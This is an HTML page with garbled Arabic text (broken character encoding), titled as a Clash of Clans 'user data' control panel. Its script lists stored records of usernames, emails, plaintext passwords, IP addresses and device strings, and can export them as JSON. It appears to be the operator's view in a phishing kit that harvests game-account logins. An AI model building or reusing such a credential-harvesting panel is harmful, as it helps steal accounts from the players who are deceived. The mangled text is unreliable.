<!DOCTYPE html>
<html dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…ÙŠÙ†</title>
    <style>
        body { font-family: Arial; padding: 20px; background: #f0f0f0; }
        h1 { color: #1a237e; }
        .data-item { 
            background: white; 
            padding: 15px; 
            margin: 10px 0; 
            border-radius: 8px;
            border-left: 5px solid #FFD700;
        }
        .admin-panel {
            max-width: 800px;
            margin: 0 auto;
            background: white;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
        }
        .stats {
            background: #1a237e;
            color: white;
            padding: 15px;
            border-radius: 8px;
            margin-bottom: 20px;
        }
        button {
            background: #FFD700;
            color: #1a237e;
            border: none;
            padding: 10px 20px;
            border-radius: 5px;
            cursor: pointer;
            margin: 5px;
        }
    </style>
</head>
<body>
    <div class="admin-panel">
        <h1>ğŸ‘‘ Ù„ÙˆØ­Ø© ØªØ­ÙƒÙ… ÙƒÙ„Ø§Ø´ Ø£ÙˆÙ ÙƒÙ„Ø§Ù†Ø³</h1>
        
        <div class="stats">
            <h3>Ø§Ù„Ø¥Ø­ØµØ§Ø¦ÙŠØ§Øª:</h3>
            <p id="stats">Ø¬Ø§Ø±ÙŠ ØªØ­Ù…ÙŠÙ„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª...</p>
        </div>
        
        <div>
            <button onclick="loadData()">ğŸ”„ ØªØ­Ø¯ÙŠØ« Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª</button>
            <button onclick="clearData()">ğŸ—‘ï¸ Ù…Ø³Ø­ Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª</button>
            <button onclick="exportData()">ğŸ“¥ ØªØµØ¯ÙŠØ± ÙƒÙ…Ù„Ù JSON</button>
        </div>
        
        <div id="dataContainer">
            <p>Ø¬Ø§Ø±ÙŠ ØªØ­Ù…ÙŠÙ„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª...</p>
        </div>
    </div>
    
    <script>
        // ØªØ­Ù…ÙŠÙ„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ù…Ù† LocalStorage
        function loadData() {
            const data = JSON.parse(localStorage.getItem('coc_users') || '[]');
            
            // Ø¹Ø±Ø¶ Ø§Ù„Ø¥Ø­ØµØ§Ø¦ÙŠØ§Øª
            document.getElementById('stats').innerHTML = `
                Ø§Ù„Ø¹Ø¯Ø¯ Ø§Ù„ÙƒÙ„ÙŠ: ${data.length} Ù…Ø³ØªØ®Ø¯Ù…<br>
                Ø¢Ø®Ø± ØªØ³Ø¬ÙŠÙ„: ${data.length > 0 ? new Date(data[data.length-1].timestamp).toLocaleString('ar-SA') : 'Ù„Ø§ ÙŠÙˆØ¬Ø¯'}
            `;
            
            // Ø¹Ø±Ø¶ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª
            const container = document.getElementById('dataContainer');
            
            if (data.length === 0) {
                container.innerHTML = '<p style="text-align:center;color:#666;">Ù„Ø§ ØªÙˆØ¬Ø¯ Ø¨ÙŠØ§Ù†Ø§Øª Ø¨Ø¹Ø¯</p>';
                return;
            }
            
            let html = '';
            data.forEach((user, index) => {
                html += `
                <div class="data-item">
                    <h3>ğŸ‘¤ ${user.username || 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ'} (#${index + 1})</h3>
                    <p><strong>ğŸ“§ Ø§Ù„Ø¨Ø±ÙŠØ¯:</strong> ${user.email || 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ'}</p>
                    <p><strong>ğŸ”‘ ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ±:</strong> ${user.password || 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ'}</p>
                    <p><strong>ğŸ® Ø§Ù„Ù…Ø³ØªÙˆÙ‰:</strong> ${user.playerLevel || 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ'}</p>
                    <p><strong>ğŸ° Ø§Ù„Ø¹Ø´ÙŠØ±Ø©:</strong> ${user.clanName || 'Ù„Ø§ ÙŠÙˆØ¬Ø¯'}</p>
                    <p><strong>â° Ø§Ù„ÙˆÙ‚Øª:</strong> ${new Date(user.timestamp).toLocaleString('ar-SA')}</p>
                    <p><strong>ğŸŒ IP:</strong> ${user.ip || 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ'}</p>
                    <p><strong>ğŸ“± Ø§Ù„Ø¬Ù‡Ø§Ø²:</strong> ${user.userAgent ? user.userAgent.substring(0, 50) + '...' : 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ'}</p>
                </div>
                `;
            });
            
            container.innerHTML = html;
        }
        
        // Ù…Ø³Ø­ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª
        function clearData() {
            if (confirm('Ù‡Ù„ Ø£Ù†Øª Ù…ØªØ£ÙƒØ¯ Ù…Ù† Ù…Ø³Ø­ Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§ØªØŸ')) {
                localStorage.removeItem('coc_users');
                alert('ØªÙ… Ù…Ø³Ø­ Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª');
                loadData();
            }
        }
        
        // ØªØµØ¯ÙŠØ± Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª
        function exportData() {
            const data = JSON.parse(localStorage.getItem('coc_users') || '[]');
            const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
            const link = document.createElement('a');
            link.href = URL.createObjectURL(blob);
            link.download = 'coc-users-data.json';
            link.click();
        }
        
        // ØªØ­Ù…ÙŠÙ„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø¹Ù†Ø¯ ÙØªØ­ Ø§Ù„ØµÙØ­Ø©
        window.onload = loadData;
    </script>
</body>
</html>
